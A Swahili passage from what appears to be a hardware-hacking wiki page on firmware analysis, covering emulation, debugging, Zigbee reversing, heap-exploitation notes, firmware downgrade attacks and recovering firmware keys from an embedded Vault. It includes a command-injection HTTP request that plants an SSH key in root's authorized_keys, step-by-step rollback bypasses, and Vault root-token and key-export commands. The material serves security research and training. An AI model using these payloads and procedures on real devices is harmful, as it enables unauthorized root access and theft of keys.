Mchambuzi anapodhibiti kernel ya QEMU, initramfs na virtual disks, root iliyorekebishwa inaweza kuwashwa kwa kubadilisha PID 1 ya uthibitishaji ya vendor na init ndogo iliyounganishwa statically. Huu ni **ubadilishaji wa lab boot-chain**, si kuvunja dm-verity, sahihi yake ya RSA, Secure Boot au ufunguo uliofungwa kwa TPM.<sup>[[11]](#references)</sup>

Init mbadala inapaswa kuakisi sehemu za kiutendaji za njia ya awali ya boot: mount `devtmpfs`, kuita `setsid()`, kuunganisha `/dev/console` na file descriptors 0–2, mount `/proc` na `/sys`, kusubiri block device iliyotolewa, mount root iliyohaririwa katika hali ya kusoma pekee, kutenganisha pseudo-filesystems za old-root, kuhamisha mount mpya hadi `/`, kufanya `chroot`, na kutekeleza `/sbin/init` ya awali ya firmware kwa `execve()`. Kutenganisha `/dev`, `/proc` na `/sys` **kabla** ya `MS_MOVE` huzuia kutenganisha kwa bahati mbaya mount points zilizo kwenye root mpya.<sup>[[11]](#references)</sup>

Weka hali ya kifaa inayoweza kubadilika tofauti na root isiyobadilika iliyorekebishwa. Overlay ya qcow2 inaweza kuhifadhi hali ya LVM ya diski ya awali, huku diski ya pili ya virtio ya kusoma pekee ikitoa SquashFS iliyohaririwa:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Utatuzi wa hitilafu za hali ya image bila kuwasha

Kagua hali endelevu nje ya guest pale kuwasha polepole, script za kuwasha zinazoharibu data, au logi za console zisizoaminika zinapoficha hitilafu. Usiambatishe overlay inayotumiwa na VM inayoendesha; ifichue kwa `qemu-nbd`, punguza ugunduzi wa LVM kwenye partition iliyokusudiwa ya NBD, na uzime volume group kabla ya kuikata.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Kwa ajili ya kutenga hitilafu kwa njia inayoweza kurudiwa, andika faili za alama zenye mihuri ya muda kwenye volume thabiti inayoweza kuandikika na uzihakiki ukiwa offline; `/dev/kmsg`, FIFOs, na consoles za muda mfupi zinaweza kutoa matokeo hasi ya uongo kwa sababu ya kuwekwa kwa vikomo vya kasi au mchakato kufa mapema. Pia linganisha interfaces halisi katika tabaka zote kabla ya kubadilisha code isiyohusiana: `uname -r` dhidi ya `/lib/modules/`, vipengele vya ext4 vilivyo kwenye diski dhidi ya usanidi wa kernel, na kizazi cha Mesa `libGL` dhidi ya ABI ya DRI driver na majina ya driver yanayotokana na PCI. Kipengele kinaweza kuwepo na hata `dlopen()` kufanikiwa, lakini kikabaki kisichoweza kutumika kwa sababu mtumiaji wake anatarajia ABI tofauti.<sup>[[11]](#references)</sup>

## Uchambuzi wa Kihamasishaji kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au yaliyohamasishwa hutumika kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwa OS na mfumo wa faili. Uhamasishaji huenda usiige kikamilifu mwingiliano wa maunzi, hivyo wakati mwingine ni lazima kuwasha upya uhamasishaji. Uchambuzi unapaswa kuchunguza tena mfumo wa faili, kutumia vibaya kurasa za wavuti zilizo wazi na huduma za mtandao, na kuchunguza udhaifu wa bootloader. Majaribio ya uadilifu wa firmware ni muhimu ili kubaini udhaifu unaoweza kusababishwa na backdoor.

## Mbinu za Uchambuzi wa Wakati wa Uendeshaji

Uchambuzi wa wakati wa uendeshaji huhusisha kuingiliana na mchakato au binary katika mazingira yake ya uendeshaji, kwa kutumia zana kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kubaini udhaifu kupitia fuzzing na mbinu nyingine.

Kwa malengo yaliyopachikwa yasiyo na debugger kamili, **nakili `gdbserver` iliyounganishwa kwa njia tuli** kwenye kifaa na uunganishe nayo ukiwa mbali:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Ramani ya ujumbe wa Zigbee / radio-co-processor

Katika vitovu vya IoT, stack ya RF mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Mtiririko huu wa kazi ni muhimu katika kufuatilia njia:<sup>[[8]](#references)</sup>

1. **RF frame** inayosafirishwa hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au itifaki ya TLV** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** katika daemon kuu
5. **protocol-specific handler / state machine**

Muundo huu huunda malengo mawili ya reversing badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa itifaki ya maandishi kama `Group,Command,arg1,arg2,...`, bainisha:

- **message groups** na dispatch tables
- Ni ujumbe gani unaweza kutoka kwenye **network** dhidi ya kutoka kwenye controller yenyewe
- Sehemu haswa za **manufacturer-specific discriminator** (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers zipi zinazoweza kufikiwa tu wakati wa **commissioning**, discovery, au awamu za kupakua firmware/model

Kwa Zigbee hasa, rekodi trafiki ya pairing na uhakikishe kama kifaa lengwa bado kinategemea **Link Key** chaguomsingi `ZigBeeAlliance09`. Ikiwa ndivyo, kunasa trafiki ya commissioning kunaweza kufichua **Network Key**. Nambari za usakinishaji za Zigbee 3.0 hupunguza hatari hii, kwa hiyo kumbuka ikiwa kifaa kilichojaribiwa kinazitekeleza kweli.

### Manufacturer-specific protocol handlers na ufikikaji unaodhibitiwa na FSM

Amri za Zigbee/ZCL maalum za vendor mara nyingi ni malengo bora kuliko clusters zilizosanifishwa kwa sababu hupitisha data kwenye **custom parsing code** na **FSMs** za ndani zenye uthibitishaji ambao haujajaribiwa sana.<sup>[[8]](#references)</sup>

Mtiririko wa kazi unaotekelezeka:

- Fanya reverse ya command dispatcher hadi upate **vendor-only handler**.
- Baini majedwali ya **FSM state**, **event**, **check**, **action**, na **next-state**.
- Tambua **transitional states** zinazoendelea zenyewe, pamoja na matawi ya retry/error ambayo hatimaye huweka upya au kuachilia hali inayodhibitiwa na mshambuliaji.
- Thibitisha ni mabadilishano yapi halali ya itifaki yanahitajika ili kuweka daemon katika hali iliyo hatarini, badala ya kudhani kuwa handler yenye hitilafu inaweza kufikiwa kila wakati.

Kwa itifaki zinazohitaji muda sahihi, packet replay kutoka kwenye Python framework inaweza kuwa polepole mno. Njia ya kuaminika zaidi ni kuiga kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) kwa kutumia stack ya kiwango cha vendor ili uweze kufichua **endpoints**, **attributes**, na muda sahihi wa commissioning.

### Aina ya hitilafu ya upakuaji uliogawanywa katika daemons zilizopachikwa

Aina ya hitilafu ya firmware inayojirudia hupatikana katika upakuaji uliogawanywa wa **blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **Kipande cha kwanza** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga kumbukumbu kwa `malloc(total_size)`.
2. Vipande vinavyofuata hukagua tu sehemu za **packet-local** zinazodhibitiwa na mshambuliaji, kama vile `packet_total_size >= offset + chunk_len`.
3. Nakala hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kuangalia dhidi ya **ukubwa wa awali uliotengewa kumbukumbu**.

Hii humwezesha mshambuliaji kutuma:

- Kipande cha kwanza halali chenye ukubwa mdogo wa jumla uliotangazwa ili kulazimisha ugawaji mdogo wa heap.
- Kipande kinachofuata chenye **offset inayotarajiwa** lakini `chunk_len` kubwa zaidi.
- Ukubwa ghushi wa packet-local unaopita ukaguzi mpya huku bado ukisababisha buffer iliyotengewa awali kufurika.

Ikiwa njia iliyo hatarini imezuiliwa na mantiki ya commissioning, unyonyaji lazima ujumuishe **device emulation** ya kutosha ili kupeleka kifaa lengwa kwenye hali inayotarajiwa ya upakuaji wa model au blob kabla ya kutuma vipande vilivyoharibika.

### Vichochezi vya `free()` vinavyoendeshwa na itifaki

Katika daemons zilizopachikwa, njia rahisi zaidi ya kusababisha unyonyaji wa heap metadata mara nyingi si “kusubiri usafishaji” bali ni **kulazimisha utaratibu wa kushughulikia makosa wa itifaki yenyewe**:<sup>[[8]](#references)</sup>

- Tuma vipande vya ufuatiliaji vilivyoharibika ili kupeleka FSM kwenye hali za **retry** au **error**.
- Vuka kikomo cha majaribio ili daemon **iweke upya muktadha** na kuachilia buffer iliyoharibiwa.
- Tumia `free()` hii inayotabirika kusababisha primitives za allocator kabla mchakato haujaanguka kwa sababu nyingine zisizohusiana.

Hii ni muhimu hasa dhidi ya allocators zinazofanana na **musl/uClibc/dlmalloc** katika Linux iliyopachikwa, ambapo kuharibu chunk metadata kunaweza kubadilisha mantiki ya unlink/unbin kuwa primitive ya kuandika. Mbinu thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks zilizowekwa ndani ya buffer iliyofurika**, badala ya kuharibu moja kwa moja bin pointers halisi na kuangusha mchakato.

## Unyonyaji wa Binary na Proof-of-Concept

Kutengeneza PoC kwa udhaifu uliobainishwa kunahitaji kuelewa kwa kina usanifu wa kifaa lengwa na kutumia lugha za kiwango cha chini. Ulinzi wa binary runtime katika mifumo iliyopachikwa ni nadra, lakini unapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### Dokezo kuhusu unyonyaji wa uClibc fastbin (Linux iliyopachikwa)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Ugawaji mkubwa wa baadaye unaweza kuanzisha `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipite ukaguzi (ukubwa unaokubalika, `fd = 0`, na chunks zinazoizunguka kuonekana kuwa "in use").<sup>[[6]](#references)</sup>
- **Binaries zisizo za PIE chini ya ASLR:** ikiwa ASLR imewezeshwa lakini binary kuu ni **non-PIE**, anwani za `.data/.bss` ndani ya binary huwa thabiti. Unaweza kulenga eneo ambalo tayari linafanana na heap chunk header halali ili kuelekeza ugawaji wa fastbin kwenye **function pointer table**.
- **NUL inayosimamisha parser:** JSON inapochanganuliwa, `\x00` kwenye payload inaweza kusimamisha uchanganuzi huku ikihifadhi byte za mshambuliaji zilizo nyuma yake kwa stack pivot/ROP chain.
- **Shellcode kupitia `/proc/self/mem`:** ROP chain inayoita `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kuweka shellcode inayoweza kutekelezwa kwenye mapping inayojulikana na kisha kurukia huko.

## Mifumo ya Uendeshaji Iliyotayarishwa kwa Uchambuzi wa Firmware

Mifumo ya uendeshaji kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa awali kwa ajili ya majaribio ya usalama wa firmware, yakiwa na zana zinazohitajika.

## Mifumo ya Uendeshaji Iliyotayarishwa kwa Uchambuzi wa Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya tathmini ya usalama na majaribio ya kupenya kwenye vifaa vya Internet of Things (IoT). Huokoa muda mwingi kwa kutoa mazingira yaliyosanidiwa awali yenye zana zote muhimu zilizopakiwa.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Mfumo wa uendeshaji wa majaribio ya usalama wa mifumo iliyopachikwa, unaotegemea Ubuntu 18.04 na kuja na zana za majaribio ya usalama wa firmware zikiwa zimepakiwa awali.

## Mashambulizi ya Kushusha Toleo la Firmware na Mbinu za Usasishaji Zisizo Salama

Hata vendor anapotekeleza ukaguzi wa saini za kriptografia kwa picha za firmware, **ulinzi dhidi ya kurejesha toleo la zamani (downgrade) mara nyingi huachwa**. Ikiwa boot- au recovery-loader hukagua tu saini kwa kutumia public key iliyopachikwa lakini hailinganishi *toleo* (au kaunta inayoongezeka tu) ya picha inayowekwa, mshambuliaji anaweza kusakinisha kihalali **firmware ya zamani iliyo hatarini ambayo bado ina saini halali**, na hivyo kurejesha udhaifu uliokuwa umerekebishwa.<sup>[[4]](#references)</sup>

Mtiririko wa kawaida wa shambulio:

1. **Pata picha ya zamani iliyosainiwa**
   * Ipakue kutoka kwenye tovuti ya umma ya upakuaji ya vendor, CDN au tovuti ya usaidizi.
   * Itoe kwenye programu za simu/kompyuta zinazoandamana na kifaa (kwa mfano ndani ya Android APK kwenye `assets/firmware/`).
   * Ipate kwenye hazina za watu wengine kama VirusTotal, Internet archives, forums, n.k.
2. **Pakia au toa picha hiyo kwa kifaa** kupitia njia yoyote ya usasishaji iliyo wazi:
   * Web UI, API ya programu ya simu, USB, TFTP, MQTT, n.k.
   * Vifaa vingi vya IoT vya watumiaji vina endpoints za HTTP(S) *zisizohitaji uthibitishaji*, zinazokubali firmware blobs zilizosimbwa kwa Base64, kuzifungua upande wa seva na kuanzisha recovery/upgrade.
3. Baada ya kushusha toleo, nyonya udhaifu uliorekebishwa kwenye toleo jipya zaidi (kwa mfano kichujio cha command-injection kilichoongezwa baadaye).
4. Kwa hiari, weka picha ya toleo jipya zaidi tena au zima masasisho ili kuepuka kutambuliwa baada ya kupata persistence.

### Mfano: Command Injection Baada ya Kushusha Toleo

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Katika firmware iliyo hatarini (iliyorejeshwa kwenye toleo la zamani), kigezo cha `md5` huunganishwa moja kwa moja kwenye amri ya shell bila kusafishwa, na hivyo kuruhusu injection ya amri zozote (hapa—kuwezesha ufikiaji wa root kwa kutumia SSH key). Matoleo ya baadaye ya firmware yalianzisha kichujio cha msingi cha herufi, lakini kutokuwepo kwa ulinzi dhidi ya kurejesha toleo la zamani kunafanya marekebisho hayo yasiwe na manufaa.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kutoka Kwa Programu za Simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu zao saidizi za simu ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Vifurushi hivi kwa kawaida huhifadhiwa bila usimbaji fiche ndani ya APK/APEX, kwenye njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuwezesha kutoa picha zilizotiwa saini bila kugusa maunzi halisi.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Kupita ulinzi wa anti-rollback unaotekelezwa na updater pekee katika miundo ya slot za A/B

Baadhi ya vendors hutekeleza **ratchet** ya kuzuia downgrade, lakini ndani ya mantiki ya *updater* pekee (kwa mfano, utaratibu wa UDS kupitia CAN, amri ya recovery, au wakala wa OTA wa userspace). Ikiwa **bootloader** baadaye hukagua tu sahihi/CRC ya image na kuamini jedwali la partitions au metadata ya slot, ulinzi wa rollback bado unaweza kupitishwa.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Metadata ya firmware ina maelezo ya toleo na **security ratchet** / kaunta ya monotonic.
- Updater hulinganisha ratchet ya image na thamani iliyohifadhiwa kwenye hifadhi endelevu na kukataa image za zamani zilizosainiwa.
- **Bootloader** haisomi ratchet hiyo, na hukagua tu header, CRC na sahihi kabla ya kuwasha slot iliyochaguliwa.
- Uwashaji wa slot huhifadhiwa kando kwenye jedwali la partitions au kaunta ya generation ya kila slot, na **haujaunganishwa kwa njia ya kriptografia** na digest halisi ya firmware iliyothibitishwa.

Hili hutengeneza primitive ya **kuthibitisha image moja / kuwasha image nyingine** katika mifumo ya dual-slot. Ikiwa mshambuliaji anaweza kufanya updater iweke slot B kuwa lengo la kuwasha linalofuata kwa kutumia image ya sasa iliyosainiwa, kisha kubadilisha slot B kabla ya kuwasha upya, bootloader bado inaweza kuwasha image iliyopunguzwa toleo kwa sababu huamini tu metadata ya slot ambayo tayari imehifadhiwa.

Mfumo wa kawaida wa matumizi mabaya:

1. Pakia firmware **ya sasa iliyosainiwa** kwenye slot tulivu na utekeleze utaratibu wa kawaida wa uthibitishaji/kubadilisha ili mpangilio uweke slot hiyo kuwa amilifu inayofuata.
2. **Usiwashie upya bado**. Ingia tena kwenye utaratibu wa kuandaa/kufuta slot katika kipindi hicho hicho.
3. Tumia vibaya hali ya boot iliyopitwa na wakati au mantiki ya kuchagua slot iliyopitwa na wakati ili updater ifute **slot ileile ya kimwili** ambayo ilikuwa imepandishwa cheo hivi punde.
4. Andika firmware **ya zamani lakini bado iliyosainiwa** kwenye slot hiyo.
5. Ruka utaratibu wa uthibitishaji unaotekeleza ratchet na uwashe upya moja kwa moja.
6. Bootloader huchagua slot iliyopandishwa cheo, hukagua sahihi/uadilifu pekee, kisha huwasha image ya zamani.

Mambo ya kuangalia unapochanganua utekelezaji wa masasisho ya A/B:

- Uchaguzi wa slot unaotokana na **flags za wakati wa kuwasha** ambazo hazisasishwi baada ya mabadiliko kufanikiwa.
- Utaratibu wa aina ya `prepare_passive_slot()` unaofuta slot kwa kutegemea hali iliyopitwa na wakati badala ya **mpangilio wa sasa uliothibitishwa**.
- Kazi ya aina ya `part_write_layout()` inayoongeza tu **kaunta ya generation** / flag ya amilifu na haihifadhi hash ya image iliyothibitishwa.
- Ukaguzi wa ratchet unaotekelezwa kwenye userspace au msimbo wa updater, lakini **si** kwenye hatua za ROM / bootloader / secure boot.
- Utaratibu wa kufuta au recovery unaoacha slot ikiwa imetiwa alama kuwa inaweza kuwashwa hata baada ya maudhui yake kuondolewa na kuandikwa upya.

### Orodha ya Kukagua Mantiki ya Usasishaji

* Je, usafirishaji/uthibitishaji wa *update endpoint* umelindwa vya kutosha (TLS + uthibitishaji)?
* Je, kifaa hulinganisha **nambari za toleo** au **kaunta ya monotonic ya anti-rollback** kabla ya kuandika firmware?
* Je, image inathibitishwa ndani ya mnyororo wa secure boot (kwa mfano, sahihi hukaguliwa na msimbo wa ROM)?
* Je, **bootloader hutekeleza ratchet ileile** kama updater, badala ya kukagua sahihi/CRC pekee?
* Je, metadata ya kuwasha slot **imeunganishwa na digest/toleo la firmware lililothibitishwa**, au slot inaweza kubadilishwa baada ya kupandishwa cheo?
* Baada ya kubadilisha slot kwa mafanikio, je, kifaa hulazimishwa kuwasha upya au bado inawezekana kufikia taratibu za baadaye za kusasisha/kufuta katika kipindi hicho hicho?
* Je, msimbo wa userland hufanya ukaguzi wa ziada wa usahihi (kwa mfano, ramani ya partitions inayoruhusiwa, nambari ya modeli)?
* Je, mifumo ya usasishaji ya *sehemu* au ya *backup* hutumia tena mantiki ileile ya uthibitishaji?

> 💡 Ikiwa mojawapo ya mambo yaliyo hapo juu haipo, kuna uwezekano jukwaa hilo linaweza kushambuliwa kwa rollback.

## Firmware iliyo hatarini kwa mazoezi

Ili kufanya mazoezi ya kugundua udhaifu kwenye firmware, tumia miradi ifuatayo ya firmware iliyo hatarini kama mwanzo.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kurejesha funguo za usimbuaji za firmware kutoka kwenye hali ya KMS/Vault iliyopachikwa

Wakati image ya sasisho huchanganya metadata ndogo ya maandishi wazi na blob kubwa yenye entropy ya juu, kagua kwanza muundo wa kontena kabla ya kujaribu brute-force:<sup>[[1]](#references)</sup>

- Tupa headers, offsets na mipaka ya mistari kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida humaanisha umbizo la OpenSSL `enc`: baiti 8 zinazofuata ni salt na baiti zilizobaki ni ciphertext.
- Sehemu ya Base64 inayofasiriwa na kutoa baiti `256` haswa ni kidokezo kikubwa kuwa unatazama ciphertext ya RSA-2048 inayofunga nenosiri nasibu la firmware/ufunguo wa kipindi.
- Nyenzo ya PGP iliyotenganishwa iliyo kwenye faili hiyo hiyo mara nyingi hulinda uhalisi pekee; usidhani kuwa ndiyo njia ya kudumisha usiri.

Ikiwa utafutaji wa funguo tuli (`grep`, `strings`, utafutaji wa PEM/PGP) hautafanikiwa, geuza uhandisi wa **mchakato wa uondoaji usimbuaji unaotumika** badala ya kutafuta funguo za faragha pekee:

- Decompile binary ya updater / usimamizi na fuatilia ni nani anayesoma blob iliyosimbwa, ni helper/API gani inayoifungua, na jina la kimantiki la ufunguo inayoomba.
- Tafuta hali ya KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na faili za unit na scripts za init kwenye root filesystem iliyotolewa.
- Chukulia amri za maandishi wazi za `vault operator unseal ...`, funguo za recovery, tokeni za bootstrap, au scripts za kufungua KMS kiotomatiki za ndani kuwa sawa na nyenzo za funguo za faragha.

Ikiwa kifaa kina binary asilia ya Vault na backend ya hifadhi, kuendesha tena mazingira hayo kwa kawaida ni rahisi kuliko kutekeleza upya mambo ya ndani ya Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Ukiwa na root kwenye KMS iliyoclone:

- Fanya transit keys ziweze kuhamishwa nje ndani ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Hamisha unwrap key: `vault read transit/export/encryption-key/<name>`
- Jaribu RSA key iliyorejeshwa kwa jozi halisi ya padding/hash inayotumiwa na KMS. Kushindwa kwa decryption ya PKCS#1 v1.5 na kushindwa kwa decryption ya OAEP ya kawaida **hakuthibitishi** kuwa key si sahihi; mifumo mingi inayotumia Vault hutumia OAEP yenye SHA-256, huku maktaba za kawaida zikichagua SHA-1 kwa chaguomsingi.
- Ikiwa payload inaanza na `Salted__`, tekeleza KDF ya OpenSSL ya vendor kwa usahihi (`EVP_BytesToKey`, mara nyingi MD5 kwenye vifaa vya zamani) kabla ya kujaribu decryption ya AES-CBC.

Hii inabadilisha tatizo la "firmware iliyosimbwa kwa njia fiche" kuwa tatizo la jumla zaidi: **rejesha operational keys za upande wa appliance, kisha tekeleza upya vigezo halisi vya unwrap + KDF nje ya mtandao**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kuvunja Usimbaji wa Firmware kwa Claude: Ujuzi wa Kiwango cha Juu, Uhuru wa Kiwango cha Mwanzo](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Udukuzi wa IoT kwa Vitendo: Mwongozo Kamili wa Kushambulia Mtandao wa Vitu](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero-days kwenye vifaa vilivyoachwa – blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Kifaa Mahiri cha $20 Kilivyonipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unaweza Kuiona: Sasa Umepwniwa](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kutumia Tesla Wall Connector kupitia kiunganishi chake cha chaji - Sehemu ya 2: kukwepa uzuiaji wa downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Ifanye Iwaka: Kutumia Philips Hue Bridge kupitia Over-the-Air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS kwenye QEMU Sehemu ya 1: Kufungua kifurushi](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Nyaraka za Linux kernel - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS kwenye QEMU Sehemu ya 2: Kutatua hitilafu na Kurekebisha](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Nywila za Dell BIOS: Usimbaji hafifu wa XOR huruhusu kurejesha nywila kutoka SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Zana za kurejesha nywila za Dell BIOS](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Kuimarisha Ujuzi wa Udukuzi wa Vifaa Sehemu ya 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
